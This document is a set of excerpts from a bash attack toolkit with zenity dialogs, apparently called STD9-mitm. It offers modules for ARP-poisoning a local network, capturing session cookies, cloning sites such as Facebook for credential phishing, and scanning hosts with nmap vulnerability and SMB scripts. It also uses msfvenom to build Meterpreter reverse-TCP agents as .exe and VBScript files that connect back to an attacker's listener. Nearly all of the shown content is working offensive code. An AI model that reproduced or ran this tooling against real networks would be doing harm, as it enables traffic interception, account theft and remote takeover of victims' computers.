...
sleep 2
# run module?
rUn=$(zenity --question --title="☠ STD9-mitm TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270)
if [ "$?" -eq "0" ]; then
...
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
  ...
  sleep 1
fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter through STD9-mitm." --entry --width 270)
fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through STD9-mitm.\nchose gateway ip, if you dont have any more targets." --entry --width 270)
  ...
  dd=`ls $IPATH/logs`
  if ! [ -z "$dd" ]; then
  Qu=$(zenity --info --title="☠ STD9-mitm TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270)
  fi
...
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
  ...
  sleep 1
  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nChose target to filter through STD9-mitm." --entry --width 270)
  FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid=\nIf you want to capture all cookies use:Cookie\nInput a cookie name to filter through STD9-mitm." --entry --width 270)
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
...
cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.com\nchose domain name to be cloned." --entry --width 270)
  ...
  wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js,.css,.gif $cLon | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="Cloning webpage: $cLon" --percentage=0 --auto-close --width 300
...
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270)
  ...
  nmap -sV -PN -p 80 $GaTe -oN $IPATH/output/retrieve.log | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="Gather modem ip addr, mac addr and hostname .." --percentage=0 --auto-close --width 320
...
Tc=$(zenity --list --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text "This module allow users to filter one or two targets" --radiolist --column "Pick" --column "Option" TRUE "one target input" FALSE "two targets input" --width 300 --height 180)
...
if [ "$scnt" = "Scan LAN for active shares" ];then
  ...
  nmap -sS -Pn -T4 -f --script smb-enum-shares.nse,smb-os-discovery.nse -p 445 $IP_RANGE -oN $IPATH/logs/SMBrelay.report | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan for shares" --percentage=0 --auto-close --width 300
...
if [ "$form" = "Build binary.exe agent" ]; then
  ...
  sleep 2
  xterm -T "STD9-mitm - BUILD AGENT.exe" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f exe -n 20 -o $IPATH/output/agent.exe"
elif [ "$form" = "Build VBScript agent" ]; then
  echo ${BlueF}[☠]${white} Building rc4 agent.vbs ..${Reset};
  sleep 2
  xterm -T "STD9-mitm - BUILD AGENT.vbs" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true RC4PASSWORD=phobetor -f psh-cmd -n 20 -o $IPATH/output/chars.raw"
...
sleep 2
# run module?
rUn=$(zenity --question --title="☠ STD9-mitm TCP/IP HIJACKING ☠" --text "Execute this module?" --width 320)
if [ "$?" -eq "0" ]; then
...
if [ "$IPH_UA" = "YES" ]; then
  ...
  if [ "$Tc" = "Normal" ]; then
    nmap -sn $IP_RANGE -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ Normal ].." --percentage=0 --auto-close --width 300
    ...
    nmap -sS $IP_RANGE -O -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ Stealth ] .." --percentage=0 --auto-close --width 300
    # strip results and print report
    ...
    nmap -sV -T4 -Pn -oN $IPATH/logs/lan.mop --script vuln $IP_RANGE | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ NSE ] .." --percentage=0 --auto-close --width 300
    # strip results and print report
    ...
    nmap -sS -Pn --reason -oN $IPATH/logs/lan.mop --script vuln $target | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning: $target [ NSE ] .." --percentage=0 --auto-close --width 320
    # strip results and print report
    cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470
  fi
